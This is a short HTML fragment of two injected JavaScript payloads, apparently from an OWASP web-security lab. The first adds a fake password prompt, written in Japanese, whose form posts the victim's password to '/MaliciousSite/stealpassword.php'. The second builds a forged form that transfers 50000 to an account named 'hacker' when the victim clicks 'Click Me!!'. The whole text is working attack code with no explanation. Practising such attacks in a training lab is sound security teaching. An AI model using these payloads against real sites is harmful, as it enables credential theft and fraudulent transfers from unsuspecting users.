<script type="text/javascript" >
	f = document.createElement("form");
	f.appendChild(document.createTextNode("パスワードを入力してください"));
	f.setAttribute("method","post");
	f.setAttribute("action","/MaliciousSite/stealpassword.php");
	f.setAttribute("name","f1");
	i1 = document.createElement("input");
	i1.setAttribute("type","text");
	i1.setAttribute("name","psw");
	f.appendChild(i1);
	i3 = document.createElement("input");
	i3.setAttribute("type","submit");
	i3.setAttribute("value","OK");
	f.appendChild(i3);
	document.all.d.appendChild(f);
</script>
<script type="text/javascript" >
	f = document.createElement("form");
	f.setAttribute("method","post");
	f.setAttribute("action","/OWASP/a05/2/execute.php");
	f.setAttribute("name","f1");
	i1 = document.createElement("input");
	i1.setAttribute("type","text");
	i1.setAttribute("name","account");
	i1.setAttribute("value","hacker");
	f.appendChild(i1);
	i2 = document.createElement("input");
	i2.setAttribute("type","text");
	i2.setAttribute("name","money");
	i2.setAttribute("value","50000");
	f.appendChild(i2);
	i3 = document.createElement("input");
	i3.setAttribute("type","submit");
	i3.setAttribute("value","Click Me!!");
	f.appendChild(i3);
	document.all.d.appendChild(f);
</script>
